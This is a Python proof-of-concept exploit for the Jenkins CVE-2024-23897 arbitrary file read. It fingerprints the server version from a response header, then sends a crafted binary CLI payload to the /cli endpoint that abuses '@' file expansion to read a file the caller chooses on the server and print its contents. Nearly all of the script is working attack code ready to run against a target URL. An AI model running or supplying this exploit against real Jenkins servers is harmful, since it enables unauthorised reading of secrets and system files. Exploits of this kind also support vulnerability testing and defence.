#!/usr/bin/env python

import argparse
import asyncio
import sys
import urllib.parse
import uuid

import aiohttp
import requests
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def validate_url(url):
    parsed_url = urllib.parse.urlparse(url)
    if parsed_url.scheme and parsed_url.netloc:
        return parsed_url.geturl().rstrip("/")
    error_msg = f"Invalid URL: {url}"
    raise ValueError(error_msg)


def is_vulnerable(url):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()

        version = response.headers.get("X-Jenkins")

        if version:
            if float(version) <= 2.441:
                print(f"[i] Vulnerable to CVE-2024-23897 (Jenkins v{version} <= 2.441)")
            else:
                print(f"[X] Not vulnerable (Jenkins v{version} > 2.441)")
                sys.exit(1)
        else:
            print("[X] No X-Jenkins header found.")
            sys.exit(1)

    except requests.exceptions.RequestException as e:
        print(f"[X] Error making request to URL: {e}")
        sys.exit(1)


async def download_task(cli_endpoint, session_id, proxies):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(
                url=cli_endpoint,
                headers={
                    "Session": session_id,
                    "Side": "download",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                ssl=False,
                # proxies=proxies,
                timeout=5,
            ) as download_response:
                download_response.raise_for_status()
                print("[i] Download request done")

                if download_response:
                    print("[+] Found data, printing...")
                    print("")
                    data = await download_response.text()
                    print(f"{data}")
                else:
                    print("[X] Error retrieving data")

        except Exception as e:
            print(f"[X] Download request failed: {e}")


async def upload_task(cli_endpoint, session_id, post_data, proxies):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(
                url=cli_endpoint,
                headers={
                    "Session": session_id,
                    "Side": "upload",
                    "Content-Type": "application/octet-stream",
                },
                ssl=False,
                data=post_data,
                # proxies=proxies,
                timeout=5,
            ) as upload_response:
                upload_response.raise_for_status()
                print("[i] Upload request done")

        except Exception as e:
            print(f"[X] Upload request failed: {e}")


async def main():
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    proxies = {"http": "", "https": ""}

    parser = argparse.ArgumentParser(description="Jenkins CVE-2024-23897 file-read PoC")
    parser.add_argument(
        "--url",
        default="http://localhost:1234",
        help="URL for Jenkins instance (default: http://localhost:1234)",
    )
    parser.add_argument(
        "--file",
        default="/etc/hostname",
        help="File to read (default: /etc/hostname)",
    )
    parser.add_argument(
        "--method",
        type=int,
        choices=[1, 2, 3],
        default=1,
        help="The method to use [connect-node(1), who-am-i(2), or help(3)] (default: 1)",
    )
    args = parser.parse_args()

    jenkins_url = args.url
    file = args.file

    methods = {
        1: b"\x00\x00\x00\x0e\x00\x00\x0cconnect-node",
        2: b"\x00\x00\x00\x0a\x00\x00\x08who-am-i",
        3: b"\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x03\x00\x00\x011",
        4: b"\x00\x00\x00\x06\x00\x00\x04help",
    }
    method_data = methods[args.method]
    data_parts = [
        method_data,
        b"\x00\x00\x00\x10\x00\x00\x0e@",
        file.encode(),
        b"\x00\x00\x00\x07\x02\x00\x05UTF-8\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03",
    ]
    post_data = b"".join(data_parts)

    is_vulnerable(validate_url(jenkins_url))
    cli_endpoint = validate_url(jenkins_url) + "/cli?remoting=false"

    session_id = str(uuid.uuid4())

    try:
        print(f"[*] Target URL {cli_endpoint}")
        print(f"[*] Attempting to read {file}")

        tasks = [
            download_task(cli_endpoint, session_id, proxies),
            upload_task(cli_endpoint, session_id, post_data, proxies),
        ]
        await asyncio.gather(*tasks)

        # download_task = download_task(...)
        # upload_task = upload_task(...)

        # await asyncio.gather(download_task, upload_task)

        print("[i] All threads completed")

    except KeyboardInterrupt:
        print("^C, Exiting")

    except Exception as e:
        print(f"Exception raised: {e}")


if __name__ == "__main__":
    asyncio.run(main())
